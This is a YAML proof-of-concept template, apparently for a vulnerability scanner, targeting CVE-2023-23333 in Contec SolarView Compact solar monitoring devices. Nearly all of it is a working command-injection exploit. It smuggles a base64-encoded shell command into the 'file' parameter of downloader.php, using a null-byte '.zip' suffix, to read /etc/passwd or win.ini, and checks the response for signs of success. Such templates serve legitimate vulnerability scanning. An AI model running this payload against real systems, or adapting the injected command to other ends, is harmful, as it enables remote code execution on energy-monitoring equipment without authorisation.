name: poc-yaml-solarview-downloader-file-rce-cve-2023-23333
binding: 86f553b8-030d-4307-965f-8f8439e49548
manual: true
detail:
    author: Xz
    links:
        - https://github.com/Timorlover/CVE-2023-23333
        - https://cxsecurity.com/cveshow/CVE-2023-23333/
    vulnerability:
        level: critical
    description: Contec SolarView Compact是日本Contec公司的一个应用系统。提供光伏发电测量系统。Contec SolarView Compact 6.00版本及之前版本存在安全漏洞。攻击者利用该漏洞通过downloader.php绕过内部限制来执行命令。
transport: http
set:
    linux: base64("cat /etc/passwd")
    window: base64("type c:/windows/win.ini")
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /downloader.php?file=;echo%20{{linux}}|base64%20-d|bash%00.zip
        expression: response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".matches(response.body_string)
    r1:
        request:
            cache: true
            method: GET
            path: /downloader.php?file=;echo%20{{window}}|base64%20-d|bash%00.zip
            follow_redirects: false
        expression: response.status == 200 && response.body_string.contains("for 16-bit app support")
expression: r0() || r1()
